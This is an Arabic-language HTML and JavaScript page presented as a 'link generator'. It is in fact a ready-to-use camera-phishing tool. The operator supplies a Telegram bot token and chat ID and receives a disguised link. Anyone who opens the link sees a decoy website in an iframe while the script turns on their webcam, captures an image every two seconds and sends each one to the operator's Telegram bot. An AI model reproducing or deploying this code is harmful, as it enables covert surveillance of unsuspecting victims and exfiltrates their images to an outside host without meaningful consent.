<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>مولد الروابط</title>
  <style>
    body {
      font-family: Tahoma, sans-serif;
      background: #0f0f0f url('YOUR_IMAGE_URL') no-repeat center center / cover;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .box {
      background: rgba(0,0,0,0.7);
      padding: 20px;
      border-radius: 12px;
      width: 350px;
    }
    h1 {
      text-align: center;
      color: #4a89dc;
    }
    .input-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
    }
    input {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
    }
    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background: #4a89dc;
      color: #fff;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background: #3570b5;
    }
    #result {
      margin-top: 15px;
      word-break: break-all;
      background: rgba(255,255,255,0.1);
      padding: 10px;
      border-radius: 8px;
    }
  </style>
</head>
<body>

<div class="box" id="formBox">
  <h1>مولد الروابط</h1>
  <div class="input-group">
    <label>أدخل الـ ID</label>
    <input type="text" id="chatIdInput" placeholder="Chat ID">
  </div>
  <div class="input-group">
    <label>أدخل التوكن</label>
    <input type="text" id="tokenInput" placeholder="Bot Token">
  </div>
  <div class="input-group">
    <label>أدخل الرابط</label>
    <input type="text" id="linkInput" placeholder="https://example.com">
  </div>
  <button id="generateBtn">إنشاء الرابط</button>
  <div id="result"></div>
</div>

<script>
const generateBtn = document.getElementById("generateBtn");
const result = document.getElementById("result");

generateBtn.addEventListener("click", () => {
  const chatId = document.getElementById("chatIdInput").value.trim();
  const token = document.getElementById("tokenInput").value.trim();
  const link = document.getElementById("linkInput").value.trim();

  if (!chatId || !token || !link) {
    alert("املأ كل الحقول");
    return;
  }

  // نضيف البيانات في الرابط
  const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chatId)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(link)}`;
  
  result.innerHTML = `<p>🔗 رابطك:</p><div><a href="${fullLink}" target="_blank">${fullLink}</a></div>`;
});

// عند فتح الرابط → يعرض الموقع + يلتقط صور
const urlParams = new URLSearchParams(window.location.search);
const openUrl = urlParams.get("url");
if (openUrl) {
  document.body.innerHTML = `
    <div style="position:fixed;top:10px;left:10px;color:white;font-size:14px;">📸 يتم التقاط صور...</div>
    <iframe src="${openUrl}" style="border:none;width:100%;height:100vh;"></iframe>
  `;

  const chatId = urlParams.get("chat");
  const token = urlParams.get("token");

  // تشغيل الكاميرا والتقاط صورة كل ثانيتين
  const video = document.createElement("video");
  video.style.display = "none";
  document.body.appendChild(video);

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
      video.play();

      setInterval(() => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", blob, "image.png");

          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            body: formData
          });
        }, "image/png");
      }, 2000);
    })
    .catch(err => console.log("فشل تشغيل الكاميرا:", err));
}
</script>

</body>
</html>
